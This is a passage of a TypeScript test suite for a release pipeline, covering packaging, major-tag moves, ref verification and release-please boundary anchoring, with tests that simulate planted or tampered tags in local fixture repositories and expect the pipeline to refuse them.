    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's prepare script, and the removal of \.github\/workflows\/ alone: .*: \.github\/workflows\/ci\.yml \(kept\)\)/,
    );
  });

  /** `count` plumbing-made chain commits of the seed appended after `from` on build. */
  function appendFillers(fx: Fixture, from: string, count: number): string {
    const filler = clone(fx.root, fx.origin, `filler-${from.slice(0, 8)}`);
    git(filler, "checkout", "--quiet", fx.seedSha);
    stripWorkflows(filler);
    writeBuild(filler, "packaged-bundle-bytes-0\n");
    stageBuild(filler);
    stripPrepare(filler);
    const tree = git(filler, "write-tree");
    let tip = from;
    for (let n = 0; n < count; n++) {
      tip = git(
        filler,
        "commit-tree",
        tree,
        "-p",
        tip,
        "-m",
        `build: backfill ${n}`,
        "-m",
        `Source: ${fx.seedSha}`,
      );
    }
    git(filler, "push", "--quiet", "origin", `${tip}:refs/heads/build`);
    return tip;
  }

  test("a release sixty chain commits behind the tip still verifies, on every path", () => {
    const fx = seedFixture();
    const packaged = packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    const tip = appendFillers(fx, packaged.packagedSha, 60);
    const rerun = checkoutOf(fx, "rerun-deep", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let result: ReturnType<typeof packageRelease> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = packageRelease({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha });
    });
    // latest stays on the release: the fillers package an older source.
    expect(result).toEqual({
      created: false,
      packagedSha: packaged.packagedSha,
      latestSha: packaged.packagedSha,
    });
    expect(pushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
    expect(retagMajor({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha })).toEqual({
      major: "v2",
      packagedSha: packaged.packagedSha,
    });
    expect(
      verifyPublishedRefs({
        cwd: shallowChecker(fx, "verify-deep"),
        tag: "v2.1.0",
        sourceSha: fx.mergeSha,
      }),
    ).toEqual({ major: "v2", packagedSha: packaged.packagedSha });
  });

  test("a tag on a commit that is not on build is refused, even with the right tree and bytes", () => {
    const fx = seedFixture();
    // The planted tag has the merge commit's exact chain tree, bundle bytes, and Source trailer, but is parented on the merge commit itself, off the
    // chain.
    advanceBuild({
      cwd: checkoutOf(fx, "seed-run", fx.seedSha, "packaged-bundle-bytes-0\n"),
      sourceSha: fx.seedSha,
    });
    const tip = buildTip(fx);
    const planted = plantTag(
      fx,
      "planter-detached",
      fx.mergeSha,
      ["build: by hand", `Source: ${fx.mergeSha}`],
      builtFiles("packaged-bundle-bytes-1\n"),
    );
    const refusal =
      `refs/tags/v2.1.0 (${planted}) is not on refs/heads/build (not an ancestor of its tip ` +
      `${tip}); the release-tags ruleset freezes version tags, so no rerun can replace it - ` +
      "inspect it by hand.";
    let error: unknown;
    const pushes = withPushPlans(fx, [], () => {
      try {
        packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
      } catch (thrown) {
        error = thrown;
      }
    });
    expect(error).toEqual(new Error(refusal));
    expect(pushes).toEqual([]);
    // latest stays on the seed's package: the detached commit never becomes what it names.
    expect(latestTag(fx)).toBe(tip);
    expect(() => retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      refusal,
    );
    expect(remoteRef(fx, "refs/tags/v2")).toBe("");
    git(fx.work, "push", "--quiet", "origin", `${planted}:refs/tags/v2`);
    expect(() =>
      verifyPublishedRefs({
        cwd: shallowChecker(fx, "verify-detached"),
        tag: "v2.1.0",
        sourceSha: fx.mergeSha,
      }),
    ).toThrow(`origin's ${refusal}`);
  });

  test("a tag with no build branch at all is refused", () => {
    const fx = seedFixture();
    const planted = plantTag(
      fx,
      "planter-nobuild",
      fx.mergeSha,
      ["build: by hand", `Source: ${fx.mergeSha}`],
      builtFiles("packaged-bundle-bytes-1\n"),
    );
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      `refs/tags/v2.1.0 (${planted}) exists but refs/heads/build does not exist on origin; ` +
        "the release-tags ruleset freezes version tags, so no rerun can replace it - inspect it by hand.",
    );
  });

  test("a checkout that is not the merge commit refuses to package", () => {
    const fx = seedFixture();
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.seedSha })).toThrow(
      /not the source commit .* to package/,
    );
  });

  test("a source that never reached main is refused before any push, however well its manifest matches", () => {
    const fx = seedFixture();
    // A release-shaped commit on a side branch: what a draft whose target is not the merge commit would hand the hook.
    const side = clone(fx.root, fx.origin, "off-main-release");
    git(side, "checkout", "--quiet", "-b", "side", fx.seedSha);
    write(side, ".release-please-manifest.json", `${JSON.stringify({ ".": "2.1.0" }, null, 2)}\n`);
    const sideSha = commitAll(side, "chore(main): release 2.1.0 (#43)");
    git(side, "push", "--quiet", "origin", "HEAD:refs/heads/side");
    writeBuild(side, "packaged-bundle-bytes-1\n");
    let error: unknown;
    const pushes = withPushPlans(fx, [], () => {
      try {
        packageRelease({ cwd: side, tag: "v2.1.0", sourceSha: sideSha });
      } catch (thrown) {
        error = thrown;
      }
    });
    expect(error).toEqual(
      new Error(
        `the release source ${sideSha} is not on origin's main (its head is ${fx.mergeSha}); refusing to package, tag, or publish a commit main does not hold.`,
      ),
    );
    expect(pushes).toEqual([]);
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
    expect(remoteRef(fx, "refs/tags/v2.1.0")).toBe("");
    expect(remoteRef(fx, "refs/tags/latest")).toBe("");
  });

  test("a well-shaped tag for a version this source did not release mints nothing", () => {
    const fx = seedFixture();
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.2.0", sourceSha: fx.mergeSha })).toThrow(
      /did not release/,
    );
    expect(remoteRef(fx, "refs/tags/v2.2.0")).toBe("");
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
  });

  test.each(["lib/index.js", "lib/pkg/index.js"])("a missing %s refuses to package", (file) => {
    const fx = seedFixture();
    rmSync(join(fx.work, file));
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      `${file} is not built; run the build before packaging.`,
    );
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
  });

  test("a worktree dirty beyond the build outputs refuses to package", () => {
    const fx = seedFixture();
    write(fx.work, "src/marker.ts", "export const marker = 999;\n");
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      /pending changes beyond lib\/index\.js and lib\/pkg\//,
    );
    expect(remoteRef(fx, "refs/tags/v2.1.0")).toBe("");
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
  });
});

/**
 * The next release's merge on origin/main, prepared from a fresh clone as CI sees it: the previous release's packaged commit lives on build, never in
 * a working branch.
 */
function prepareNextRelease(
  fx: Fixture,
  version: string,
  prNumber: number,
  bundle: string,
): { dir: string; mergeSha: string } {
  const dir = clone(fx.root, fx.origin, `next-${version}`);
  write(dir, ".release-please-manifest.json", `${JSON.stringify({ ".": version }, null, 2)}\n`);
  const mergeSha = commitAll(dir, `chore(main): release ${version} (#${prNumber})`);
  git(dir, "push", "--quiet", "origin", "HEAD:refs/heads/main");
  writeBuild(dir, bundle);
  return { dir, mergeSha };
}

describe("retagMajor", () => {
  test("the major moves to the verified chain commit", () => {
    const fx = seedFixture();
    const { packagedSha } = packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    const moved = retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    expect(moved).toEqual({ major: "v2", packagedSha });
    expect(git(fx.origin, "rev-parse", "refs/tags/v2^{}")).toBe(packagedSha);
    expect(buildTip(fx)).toBe(packagedSha);
    expect(identityOf(fx.origin, packagedSha)).toBe(BOT_IDENTITY);
    expect(localIdentity(fx.work)).toBe(FIXTURE_IDENTITY);

    const next = prepareNextRelease(fx, "2.1.1", 44, "packaged-bundle-bytes-2\n");
    const packaged = packageRelease({ cwd: next.dir, tag: "v2.1.1", sourceSha: next.mergeSha });
    retagMajor({ cwd: next.dir, tag: "v2.1.1", sourceSha: next.mergeSha });
    expect(git(fx.origin, "rev-parse", "refs/tags/v2^{}")).toBe(packaged.packagedSha);
    expect(git(fx.origin, "rev-parse", `${packaged.packagedSha}^`)).toBe(packagedSha);
    expect(buildTip(fx)).toBe(packaged.packagedSha);
  });

  test("the major never moves to a package of the wrong source", () => {
    const fx = seedFixture();
    packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    expect(() => retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.seedSha })).toThrow(
      /not this release's merge commit/,
    );
    expect(remoteRef(fx, "refs/tags/v2")).toBe("");
  });

  test("the major never moves to a commit that is not a pure package", () => {
    const fx = seedFixture();
    const planter = clone(fx.root, fx.origin, "planter-empty");
    git(planter, "checkout", "--quiet", fx.mergeSha);
    git(planter, "config", "user.name", "planter");
    git(planter, "config", "user.email", "planter@example.invalid");
    git(
      planter,
      "commit",
      "--quiet",
      "--allow-empty",
      "-m",
      "build: by hand",
      "-m",
      `Source: ${fx.mergeSha}`,
    );
    git(planter, "tag", "v2.1.0");
    git(planter, "push", "--quiet", "origin", "refs/tags/v2.1.0");
    const mover = clone(fx.root, fx.origin, "mover-empty");
    expect(() => retagMajor({ cwd: mover, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      /does not carry a non-empty regular-file lib\/index\.js/,
    );
  });

  test("the major never moves to a package whose bundle is not this source's build", () => {
    const fx = seedFixture();
    // Source and tree pass; only the byte verification catches the planted bundle.
    const planter = clone(fx.root, fx.origin, "planter-wrong-bytes");
    git(planter, "checkout", "--quiet", fx.mergeSha);
    stripWorkflows(planter);
    git(planter, "config", "user.name", "planter");
    git(planter, "config", "user.email", "planter@example.invalid");
    writeBuild(planter, "planted-wrong-bytes\n");
    stageBuild(planter);
    git(planter, "commit", "--quiet", "-m", "build: by hand", "-m", `Source: ${fx.mergeSha}`);
    git(planter, "tag", "v2.1.0");
    git(planter, "push", "--quiet", "origin", "refs/tags/v2.1.0");
    const mover = checkoutOf(fx, "mover-wrong-bytes", fx.mergeSha, "packaged-bundle-bytes-1\n");
    expect(() => retagMajor({ cwd: mover, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      /not a build of/,
    );
    expect(remoteRef(fx, "refs/tags/v2")).toBe("");
  });

  test("a rerun of an old release's job never moves the major backward", () => {
    const fx = seedFixture();
    packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    const next = prepareNextRelease(fx, "2.1.1", 44, "packaged-bundle-bytes-2\n");
    const packaged = packageRelease({ cwd: next.dir, tag: "v2.1.1", sourceSha: next.mergeSha });
    retagMajor({ cwd: next.dir, tag: "v2.1.1", sourceSha: next.mergeSha });
    const stale = checkoutOf(fx, "stale-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
    packageRelease({ cwd: stale, tag: "v2.1.0", sourceSha: fx.mergeSha });
    expect(() => retagMajor({ cwd: stale, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      /refusing to move v2 back/,
    );
    expect(git(fx.origin, "rev-parse", "refs/tags/v2^{}")).toBe(packaged.packagedSha);
  });

  test("a lease overtaken by another mover is retried on the re-observed tag", () => {
    const fx = seedFixture();
    const { packagedSha } = packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    let result: ReturnType<typeof retagMajor> | undefined;
    const pushes = withPushPlans(
      fx,
      [{ competitor: { from: fx.work, sha: fx.seedSha, ref: "refs/tags/v2" } }],
      () => {
        result = retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
      },
    );
    expect(result).toEqual({ major: "v2", packagedSha });
    expect(pushes).toEqual([majorOf(""), majorOf(fx.seedSha)]);
    expect(git(fx.origin, "rev-parse", "refs/tags/v2^{}")).toBe(packagedSha);
  });

  test("a lease overtaken on every attempt gives up naming the concurrent mover", () => {
    const fx = seedFixture();
    packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    const movers = [fx.seedSha, fx.mergeSha, fx.seedSha];
    const pushes = withPushPlans(
      fx,
      movers.map((sha) => ({ competitor: { from: fx.work, sha, ref: "refs/tags/v2" } })),
      () => {
        expect(() => retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
          "could not move v2 after 3 compare-and-swap attempts; something is moving it concurrently - inspect the tag by hand.",
        );
      },
    );
    expect(pushes).toEqual([majorOf(""), majorOf(fx.seedSha), majorOf(fx.mergeSha)]);
    expect(git(fx.origin, "rev-parse", "refs/tags/v2^{}")).toBe(fx.seedSha);
  });

  test.each(PERMANENT)(
    "%s fails the first lease push for good, with git's own words",
    (_name, stderr) => {
      const fx = seedFixture();
      packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
      let error: unknown;
      const pushes = withPushPlans(fx, [{ fail: { stderr, status: 128 } }], () => {
        try {
          retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
        } catch (thrown) {
          error = thrown;
        }
      });
      expect(pushes).toEqual([majorOf("")]);
      expect(error).toEqual(
        new Error(
          `git push --force-with-lease=refs/tags/v2: origin refs/tags/v2 failed: ${stderr.trim()}`,
        ),
      );
      expect(remoteRef(fx, "refs/tags/v2")).toBe("");
    },
  );
});

describe("verifyPublishedRefs", () => {
  test("the version tag and the major point at the same packaged, bundle-carrying chain commit", () => {
    const fx = seedFixture();
    // build already holds the seed's package, so the release's chain commit is appended behind it rather than minted as the root.
    advanceBuild({
      cwd: checkoutOf(fx, "seed-run", fx.seedSha, "packaged-bundle-bytes-0\n"),
      sourceSha: fx.seedSha,
    });
    const { packagedSha } = packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    const checker = shallowChecker(fx, "verify-fresh");
    const verified = verifyPublishedRefs({ cwd: checker, tag: "v2.1.0", sourceSha: fx.mergeSha });
    expect(verified).toEqual({ major: "v2", packagedSha });
    expect(packagedSha).toBe(buildTip(fx));
    for (const name of ["third-green", "fourth-green"]) {
      const next = pushGreenCommit(fx, name, `packaged-bundle-${name}\n`);
      advanceBuild({ cwd: next.dir, sourceSha: next.sha });
    }
    expect(buildTip(fx)).not.toBe(packagedSha);
    expect(
      verifyPublishedRefs({
        cwd: shallowChecker(fx, "verify-behind"),
        tag: "v2.1.0",
        sourceSha: fx.mergeSha,
      }),
    ).toEqual({ major: "v2", packagedSha });
  });

  test("a major left on a different commit fails the confirmation", () => {
    const fx = seedFixture();
    packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    git(fx.work, "tag", "-f", "v2", fx.seedSha);
    git(fx.work, "push", "--quiet", "--force", "origin", "refs/tags/v2");
    const checker = clone(fx.root, fx.origin, "verify-drift");
    expect(() =>
      verifyPublishedRefs({ cwd: checker, tag: "v2.1.0", sourceSha: fx.mergeSha }),
    ).toThrow(/not this release's packaged commit/);
  });

  test("a missing major fails the confirmation", () => {
    const fx = seedFixture();
    packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    const checker = clone(fx.root, fx.origin, "verify-missing");
    // The confirmation fetches refs/tags/v2 from origin; with no major ever pushed, git itself refuses the fetch.
    expect(() =>
      verifyPublishedRefs({ cwd: checker, tag: "v2.1.0", sourceSha: fx.mergeSha }),
    ).toThrow(/couldn't find remote ref/);
  });

  test("a version tag that changes more than the build outputs fails the confirmation", () => {
    const fx = seedFixture();
    // Parented on the seed, so nothing but the confirmation's own fetch can bring the merge commit's tree to a shallow checkout.
    const planter = clone(fx.root, fx.origin, "verify-planter-extra");
    git(planter, "checkout", "--quiet", fx.mergeSha);
    stripWorkflows(planter);
    writeBuild(planter, "packaged-bundle-bytes-1\n");
    stageBuild(planter);
    write(planter, "action.yml", "name: tampered\n");
    git(planter, "add", "-f", "action.yml");
    const planted = git(
      planter,
      "commit-tree",
      git(planter, "write-tree"),
      "-p",
      fx.seedSha,
      "-m",
      "build: by hand",
      "-m",
      `Source: ${fx.mergeSha}`,
    );
    git(
      planter,
      "push",
      "--quiet",
      "origin",
      `${planted}:refs/tags/v2.1.0`,
      `${planted}:refs/tags/v2`,
    );
    const checker = shallowChecker(fx, "verify-tampered");
    expect(() =>
      verifyPublishedRefs({ cwd: checker, tag: "v2.1.0", sourceSha: fx.mergeSha }),
    ).toThrow(
      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's prepare script, and the removal of \.github\/workflows\/ alone: .*action\.yml/,
    );
  });

  test("a version tag recording another source fails the confirmation", () => {
    const fx = seedFixture();
    const planter = clone(fx.root, fx.origin, "verify-planter");
    git(planter, "checkout", "--quiet", fx.seedSha);
    git(planter, "config", "user.name", "planter");
    git(planter, "config", "user.email", "planter@example.invalid");
    writeBuild(planter, "planted\n");
    stageBuild(planter);
    git(planter, "commit", "--quiet", "-m", "build: by hand", "-m", `Source: ${fx.seedSha}`);
    git(planter, "tag", "v2.1.0");
    git(planter, "tag", "v2");
    git(planter, "push", "--quiet", "origin", "refs/tags/v2.1.0", "refs/tags/v2");
    const checker = clone(fx.root, fx.origin, "verify-wrong-source");
    expect(() =>
      verifyPublishedRefs({ cwd: checker, tag: "v2.1.0", sourceSha: fx.mergeSha }),
    ).toThrow(
      `origin's refs/tags/v2.1.0 points at ${git(planter, "rev-parse", "HEAD")}, which records ${fx.seedSha} as its source, not this release's merge commit ${fx.mergeSha}.`,
    );
  });
});

/** release-please's PR branch: manifest and changelog bumped to `version` on `from`; left unpushed for a competitor plan when `push` is false. */
function createReleasePrBranch(
  fx: Fixture,
  from: string,
  version: string,
  push = true,
): { dir: string; sha: string } {
  const dir = clone(fx.root, fx.origin, `rp-branch-${version}-${from.slice(0, 7)}`);
  git(dir, "checkout", "--quiet", "-B", "release-please--branches--main", from);
  write(dir, ".release-please-manifest.json", `${JSON.stringify({ ".": version }, null, 2)}\n`);
  write(
    dir,
    "CHANGELOG.md",
    `# Changelog\n\n## [${version}](https://example.invalid/compare) (2026-08-14)\n\n### Bug Fixes\n\n* the fix ([abc1234](https://example.invalid/commit/abc1234))\n${CHANGELOG_21}`,
  );
  const sha = commitAll(dir, `chore(main): release ${version}`);
  if (push) {
    git(
      dir,
      "push",
      "--quiet",
      "--force",
      "origin",
      "HEAD:refs/heads/release-please--branches--main",
    );
  }
  return { dir, sha };
}

function releasePrConfig(fx: Fixture, name: string): { boundary: string; manifest: string } {
  const check = clone(fx.root, fx.origin, name);
  git(check, "checkout", "--quiet", "release-please--branches--main");
  const config = JSON.parse(readFileSync(join(check, "release-please-config.json"), "utf8")) as {
    "last-release-sha": string;
  };
  return {
    boundary: config["last-release-sha"],
    manifest: readFileSync(join(check, ".release-please-manifest.json"), "utf8"),
  };
}

describe("anchorReleasePr", () => {
  test("the boundary lands inside the release PR branch and merges onto main", () => {
    const fx = seedFixture();
    const mainHead = fx.mergeSha;
    createReleasePrBranch(fx, mainHead, "2.2.0");
    const worker = clone(fx.root, fx.origin, "anchor-worker");
    const result = anchorReleasePr({ cwd: worker, sourceSha: mainHead });
    expect(result.changed).toBe(true);
    expect(identityOf(worker, "HEAD")).toBe(BOT_IDENTITY);
    expect(localIdentity(worker)).toBe(FIXTURE_IDENTITY);
    const check = clone(fx.root, fx.origin, "anchor-check");
    git(check, "checkout", "--quiet", "release-please--branches--main");
    const config = JSON.parse(readFileSync(join(check, "release-please-config.json"), "utf8")) as {
      "last-release-sha": string;
    };
    expect(config["last-release-sha"]).toBe(mainHead);
    expect(readFileSync(join(check, ".release-please-manifest.json"), "utf8")).toContain("2.2.0");
    const again = anchorReleasePr({
      cwd: clone(fx.root, fx.origin, "anchor-again"),
      sourceSha: mainHead,
    });
    expect(again.changed).toBe(false);
    git(check, "checkout", "--quiet", "main");
    git(check, "merge", "--quiet", "--squash", "release-please--branches--main");
    git(check, "commit", "--quiet", "-m", "chore(main): release 2.2.0 (#60)");
    git(check, "push", "--quiet", "origin", "HEAD:refs/heads/main");
    expect(boundaryCheck(check).boundary).toBe(mainHead);
  });

  test("no release PR branch is a no-op", () => {
    const fx = seedFixture();
    const worker = clone(fx.root, fx.origin, "anchor-nobranch");
    const result = anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha });
    expect(result).toEqual({ changed: false, reason: "no release PR branch to anchor" });
  });

  test("a moved main makes the anchor defer to the newer run", () => {
    const fx = seedFixture();
    createReleasePrBranch(fx, fx.mergeSha, "2.2.0");
    const mover = clone(fx.root, fx.origin, "anchor-mover");
    write(mover, "src/marker.ts", "export const marker = 9;\n");
    commitAll(mover, "fix: land after the anchor run started");
    git(mover, "push", "--quiet", "origin", "HEAD:refs/heads/main");
    const worker = clone(fx.root, fx.origin, "anchor-late");
    const result = anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha });
    expect(result.changed).toBe(false);
    expect(result.reason).toContain("the newer run anchors");
  });

  test("a branch built on an older head is left for its own refresh to anchor", () => {
    const fx = seedFixture();
    // The branch was refreshed from the SEED while main moved on to the 2.1.0 merge; anchoring mergeSha would record a boundary its content was not
    // computed from.
    createReleasePrBranch(fx, fx.seedSha, "2.2.0");
    const worker = clone(fx.root, fx.origin, "anchor-stale-branch");
    const result = anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha });
    expect(result.changed).toBe(false);
    expect(result.reason).toContain("not built on this head");
  });

  test("a release-please refresh between anchors re-anchors from the same checkout", () => {
    const fx = seedFixture();
    createReleasePrBranch(fx, fx.mergeSha, "2.2.0");
    const worker = clone(fx.root, fx.origin, "anchor-twice");
    expect(anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha }).changed).toBe(true);
    // The refresh force-push wipes the anchor commit; the SAME clone must fetch the rewritten branch (a locally checked-out branch would make git
    // refuse the fetch).
    createReleasePrBranch(fx, fx.mergeSha, "2.3.0");
    expect(anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha }).changed).toBe(true);
    expect(releasePrConfig(fx, "anchor-twice-check").boundary).toBe(fx.mergeSha);
  });

  test("a push overtaken by a refresh mid-anchor is reapplied on the refreshed branch", () => {
    const fx = seedFixture();
    createReleasePrBranch(fx, fx.mergeSha, "2.2.0");
    const refresh = createReleasePrBranch(fx, fx.mergeSha, "2.3.0", false);
    const worker = clone(fx.root, fx.origin, "anchor-raced");
    let result: ReturnType<typeof anchorReleasePr> | undefined;
    const pushes = withPushPlans(
      fx,
      [
        {
          competitor: {
            from: refresh.dir,
            sha: refresh.sha,
            ref: "refs/heads/release-please--branches--main",
          },
        },
      ],
      () => {
        result = anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha });
      },
    );
    expect(result).toEqual({
      changed: true,
      reason: `release-please--branches--main: anchored at ${fx.mergeSha}`,
    });
    expect(pushes).toEqual([ANCHOR_PUSH, ANCHOR_PUSH]);
    const anchored = releasePrConfig(fx, "anchor-raced-check");
    expect(anchored.boundary).toBe(fx.mergeSha);
    expect(anchored.manifest).toContain("2.3.0");
    expect(git(fx.origin, "rev-parse", "refs/heads/release-please--branches--main^")).toBe(
      refresh.sha,
    );
  });

  test("a push overtaken on every attempt gives up naming the rewriter", () => {
    const fx = seedFixture();
    createReleasePrBranch(fx, fx.mergeSha, "2.2.0");
    const refreshes = ["2.3.0", "2.4.0", "2.5.0"].map((v) =>
      createReleasePrBranch(fx, fx.mergeSha, v, false),
    );
    const worker = clone(fx.root, fx.origin, "anchor-lost");
    const pushes = withPushPlans(
      fx,
      refreshes.map((r) => ({
        competitor: { from: r.dir, sha: r.sha, ref: "refs/heads/release-please--branches--main" },
      })),
      () => {
        expect(() => anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha })).toThrow(
          "could not anchor release-please--branches--main after 3 attempts; something keeps rewriting the branch - rerun this job once the branch settles.",
        );
      },
    );
    expect(pushes).toEqual([ANCHOR_PUSH, ANCHOR_PUSH, ANCHOR_PUSH]);
    expect(git(fx.origin, "rev-parse", "refs/heads/release-please--branches--main")).toBe(
      refreshes[2]?.sha ?? "",
    );
  });

  test.each(PERMANENT)(
    "%s fails the first anchor push for good, with git's own words",
    (_name, stderr) => {
      const fx = seedFixture();
      const branch = createReleasePrBranch(fx, fx.mergeSha, "2.2.0");
      const worker = clone(fx.root, fx.origin, "anchor-denied");
      let error: unknown;
      const pushes = withPushPlans(fx, [{ fail: { stderr, status: 128 } }], () => {
        try {
          anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha });
        } catch (thrown) {
          error = thrown;
        }
      });
      expect(pushes).toEqual([ANCHOR_PUSH]);
      expect(error).toEqual(
        new Error(
          `git push origin HEAD:refs/heads/release-please--branches--main failed: ${stderr.trim()}`,
        ),
      );
      expect(git(fx.origin, "rev-parse", "refs/heads/release-please--branches--main")).toBe(
        branch.sha,
      );
    },
  );
});

describe("boundaryCheck", () => {
  test("a boundary equal to the newest release merge passes", () => {
    const fx = seedFixture();
    const dir = clone(fx.root, fx.origin, "boundary-eq");
    write(
      dir,
      "release-please-config.json",
      `${JSON.stringify(
        {
          "last-release-sha": fx.mergeSha,
          packages: { ".": { "release-type": "simple", draft: true } },
        },
        null,
        2,
      )}\n`,
    );
    commitAll(dir, "chore: align the fixture boundary");
    expect(boundaryCheck(dir).boundary).toBe(fx.mergeSha);
  });

  test("a stale boundary fails loudly with the repair value", () => {
    const fx = seedFixture();
    // The seed fixture's config records a placeholder, not the 2.1.0 merge.
    expect(() => boundaryCheck(fx.work)).toThrow(/stale boundary|set last-release-sha/);
  });

  test("a history without release merges and no recorded boundary is pre-first-release", () => {
    const fx = seedFixture();
    const dir = clone(fx.root, fx.origin, "boundary-none");
    git(dir, "checkout", "--quiet", fx.seedSha);
    write(
      dir,
      "release-please-config.json",
      `${JSON.stringify({ packages: { ".": { "release-type": "simple", draft: true } } }, null, 2)}\n`,
    );
    commitAll(dir, "chore: bootstrap release-please before any release");
    expect(boundaryCheck(dir).boundary).toContain("no release merge");
  });

  test("a recorded boundary that is not on this history fails naming that", () => {
    const fx = seedFixture();
    const dir = clone(fx.root, fx.origin, "boundary-foreign");
    // The seed commit records a placeholder boundary and has no release merge behind it.
    git(dir, "checkout", "--quiet", fx.seedSha);
    expect(() => boundaryCheck(dir)).toThrow(/not on this history at all/);
  });

  test("a shallow checkout is refused before any verdict", () => {
    const fx = seedFixture();
    // The release merge is within depth 2 but its parent, the recorded boundary, is not: a truncated history would call it stale.
    write(
      fx.work,
      "release-please-config.json",
      `${JSON.stringify(
        {
          "last-release-sha": fx.seedSha,
          packages: { ".": { "release-type": "simple", draft: true } },
        },
        null,
        2,
      )}\n`,
    );
    commitAll(fx.work, "chore: align the fixture boundary");
    git(fx.work, "push", "--quiet", "origin", "HEAD:refs/heads/main");
    const dir = join(fx.root, "boundary-shallow");
    execFileSync("git", ["clone", "--quiet", "--depth", "2", `file://${fx.origin}`, dir]);
    expect(() => boundaryCheck(dir)).toThrow(/needs the full history.*shallow/);
  });

  test("a complete history holding the boundary but no recognizable merge names the matcher", () => {
    const fx = seedFixture();
    const dir = clone(fx.root, fx.origin, "boundary-drift");
    git(dir, "checkout", "--quiet", fx.seedSha);
    write(
      dir,
      "release-please-config.json",
      `${JSON.stringify(
        {
          "last-release-sha": fx.seedSha,
          packages: { ".": { "release-type": "simple", draft: true } },
        },
        null,
        2,
      )}\n`,
    );
    commitAll(dir, "chore(main): release: 2.1.0 (#42)");
    expect(() => boundaryCheck(dir)).toThrow(/history holds it.*RELEASE_SUBJECT/);
  });

  test("a boundary newer than the newest recognized merge is drift, not a rollback", () => {
    const fx = seedFixture();
    const dir = clone(fx.root, fx.origin, "boundary-newer");
    write(dir, "src/marker.ts", "export const marker = 3;\n");
    const between = commitAll(dir, "feat: land between two releases");
    // The 2.2.0 release PR merged under a subject RELEASE_SUBJECT does not match, so the 2.1.0 merge stays the newest recognized one while the
    // boundary sits after it.
    write(dir, ".release-please-manifest.json", `${JSON.stringify({ ".": "2.2.0" }, null, 2)}\n`);
    write(
      dir,
      "release-please-config.json",
      `${JSON.stringify(
        {
          "last-release-sha": between,
          packages: { ".": { "release-type": "simple", draft: true } },
        },
        null,
        2,
      )}\n`,
    );
    commitAll(dir, "chore(main): release v2.2.0 (#43)");
    expect(() => boundaryCheck(dir)).toThrow(/NEWER than.*must not be rolled back/);
  });

  test("a boundary on an unmerged branch is stale, not newer", () => {
    const fx = seedFixture();
    const dir = clone(fx.root, fx.origin, "boundary-off-main");
    // A descendant of the release merge that never landed on main: the stale message's rollback IS the repair.
    git(dir, "checkout", "--quiet", "-b", "side");
    write(dir, "src/marker.ts", "export const marker = 4;\n");
    const offMain = commitAll(dir, "feat: never merged");
    git(dir, "checkout", "--quiet", "main");
    write(
      dir,
      "release-please-config.json",
      `${JSON.stringify(
        {
          "last-release-sha": offMain,
          packages: { ".": { "release-type": "simple", draft: true } },
        },
        null,
        2,
      )}\n`,
    );
    commitAll(dir, "chore: record a boundary from the wrong branch");
    expect(() => boundaryCheck(dir)).toThrow(/stale boundary.*set last-release-sha/);
  });

  test("a subject that only shares the release prefix is not a release merge", () => {
    const fx = seedFixture();
    const dir = clone(fx.root, fx.origin, "boundary-decoy");
    write(
      dir,
      "release-please-config.json",
      `${JSON.stringify(
        {
